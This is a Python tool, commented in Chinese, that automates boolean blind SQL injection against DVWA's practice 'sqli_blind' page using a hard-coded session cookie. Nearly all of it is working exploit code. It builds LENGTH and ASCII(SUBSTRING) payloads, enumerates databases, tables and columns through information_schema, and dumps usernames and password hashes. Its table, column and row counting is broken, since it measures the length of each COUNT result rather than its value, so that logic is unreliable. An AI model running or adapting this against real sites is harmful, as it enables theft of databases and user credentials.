#!/usr/bin/env python3

import requests
import time
import sys

class BooleanBlindSQLI:
    def __init__(self, url, cookie=None):
        """
        初始化注入器
        :param url: http://target/vulnerabilities/sqli_blind/?id=1&Submit=Submit
        :param cookie: 登录用的Cookie，如 PHPSESSID=xxx; security=low
        """
        self.url = url
        self.session = requests.Session()
        if cookie:
            # 解析Cookie字符串
            for item in cookie.split(';'):
                if '=' in item:
                    key, value = item.strip().split('=', 1)
                    self.session.cookies.set(key, value)
        
        # 判断依据：页面返回什么内容表示"存在"
        # 你可以根据实际情况修改这个关键词
        self.true_flag = "User ID exists"
        
    def inject_payload(self, payload):
        """
        发送带有 payload 的请求
        :param payload: 要注入的 SQL 语句
        :return: True=页面返回存在, False=不存在
        """
        # 构造完整参数
        params = {'id': payload, 'Submit': 'Submit'}
        
        try:
            response = self.session.get(self.url, params=params, timeout=10)
            # 根据页面内容判断 True/False
            if self.true_flag in response.text:
                return True
            return False
        except Exception as e:
            print(f"[-] 请求失败: {e}")
            return False
    
    def get_length(self, query, min_len=1, max_len=50):
        """
        二分法获取查询结果的长度
        :param query: SQL 查询语句，如 "SELECT database()"
        :return: 长度
        """
        print(f"[*] 正在获取长度: {query}")
        
        left, right = min_len, max_len
        result_len = None
        
        while left <= right:
            mid = (left + right) // 2
            # 构造判断长度的 payload
            payload = f"1' AND LENGTH(({query})) > {mid} -- -"
            
            if self.inject_payload(payload):
                left = mid + 1
            else:
                # 检查是否等于 mid
                payload_eq = f"1' AND LENGTH(({query})) = {mid} -- -"
                if self.inject_payload(payload_eq):
                    result_len = mid
                    break
                right = mid - 1
        
        if result_len is None:
            print("[-] 无法获取长度")
            return 0
        
        print(f"[+] 长度: {result_len}")
        return result_len
    
    def get_char_at_pos(self, query, pos):
        """
        获取查询结果的第 pos 个字符（使用二分法）
        :param query: SQL 查询语句
        :param pos: 字符位置（从1开始）
        :return: 字符
        """
        left, right = 32, 126  # 可打印字符范围
        result_char = None
        
        while left <= right:
            mid = (left + right) // 2
            payload = f"1' AND ASCII(SUBSTRING(({query}),{pos},1)) > {mid} -- -"
            
            if self.inject_payload(payload):
                left = mid + 1
            else:
                payload_eq = f"1' AND ASCII(SUBSTRING(({query}),{pos},1)) = {mid} -- -"
                if self.inject_payload(payload_eq):
                    result_char = chr(mid)
                    break
                right = mid - 1
        
        return result_char
    
    def extract_data(self, query, max_length=100):
        """
        完整提取查询结果
        :param query: SQL 查询语句
        :return: 提取到的字符串
        """
        # 第一步：获取长度
        length = self.get_length(query, 1, max_length)
        if length == 0:
            return ""
        
        # 第二步：逐字符提取
        result = ""
        for pos in range(1, length + 1):
            char = self.get_char_at_pos(query, pos)
            if char:
                result += char
                print(f"[*] 进度: {pos}/{length} - 当前结果: {result}")
            else:
                print(f"[-] 位置 {pos} 提取失败")
                break
        
        return result
    
    def get_current_database(self):
        """获取当前数据库名"""
        print("\n[=== 获取当前数据库 ===]")
        return self.extract_data("SELECT database()")
    
    def get_tables(self, database=None):
        """获取数据库中的所有表名（返回列表）"""
        if database is None:
            database = self.get_current_database()
        
        print(f"\n[=== 获取 {database} 库中的表 ===]")
        
        # 获取表的数量
        count_query = f"SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
        table_count = self.get_length(count_query, 1, 50)
        print(f"[*] 共有 {table_count} 张表")
        
        tables = []
        for idx in range(table_count):
            table_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {idx},1"
            table_name = self.extract_data(table_query)
            tables.append(table_name)
            print(f"[+] 表 {idx+1}: {table_name}")
        
        return tables
    
    def get_columns(self, table, database=None):
        """获取指定表的所有列名（返回列表）"""
        if database is None:
            database = self.get_current_database()
        
        print(f"\n[=== 获取 {database}.{table} 的列 ===]")
        
        # 获取列的数量
        count_query = f"SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}'"
        col_count = self.get_length(count_query, 1, 50)
        print(f"[*] 共有 {col_count} 列")
        
        columns = []
        for idx in range(col_count):
            col_query = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{database}' LIMIT {idx},1"
            col_name = self.extract_data(col_query)
            columns.append(col_name)
            print(f"[+] 列 {idx+1}: {col_name}")
        
        return columns
    
    def dump_table(self, table, columns, database=None):
        """导出表数据"""
        if database is None:
            database = self.get_current_database()
        
        print(f"\n[=== 导出 {database}.{table} 的数据 ===]")
        
        # 先获取数据行数
        count_query = f"SELECT COUNT(*) FROM {database}.{table}"
        row_count = self.get_length(count_query, 1, 500)
        print(f"[*] 共有 {row_count} 行数据")
        
        all_data = []
        for row_idx in range(row_count):
            row_data = {}
            for col in columns:
                data_query = f"SELECT {col} FROM {database}.{table} LIMIT {row_idx},1"
                value = self.extract_data(data_query)
                row_data[col] = value
            all_data.append(row_data)
            print(f"[+] 行 {row_idx+1}: {row_data}")
        
        return all_data


def main():
    # 配置信息（根据环境修改）
    target_url = "http://192.168.0.103:8080/vulnerabilities/sqli_blind/"
    # 从浏览器复制你的Cookie（登录DVWA后按F12 → Network → 找到请求 → 复制Cookie）
    cookie = "PHPSESSID=rkf9pp7p6n8ua6qvvl8s092r05; security=low"
    
    print("="*60)
    print("布尔盲注自动化脚本 - 适用于 DVWA Blind Low")
    print("="*60)
    
    # 初始化
    injector = BooleanBlindSQLI(target_url, cookie)
    
    # 测试连接
    print("\n[*] 测试连接...")
    if injector.inject_payload("1' AND '1'='1"):
        print("[+] 连接成功，注入点存在")
    else:
        print("[-] 连接失败，请检查URL和Cookie")
        sys.exit(1)
    
    # 获取当前数据库名
    db_name = injector.get_current_database()
    print(f"\n[+] 当前数据库: {db_name}")
    
    # 获取所有表名
    tables = injector.get_tables(db_name)
    
    # 如果存在 users 表，进一步提取
    if "users" in tables:
        columns = injector.get_columns("users", db_name)
        
        if "user" in columns and "password" in columns:
            print("\n[!!!] 发现敏感字段，开始导出用户凭证...")
            data = injector.dump_table("users", ["user", "password"], db_name)
            print("\n[=== 最终结果 ===]")
            for row in data:
                print(f"用户名: {row.get('user')} | 密码MD5: {row.get('password')}")
        else:
            # 导出所有列
            injector.dump_table("users", columns, db_name)
    
    print("\n[+] 脚本执行完毕")


if __name__ == "__main__":
    main()
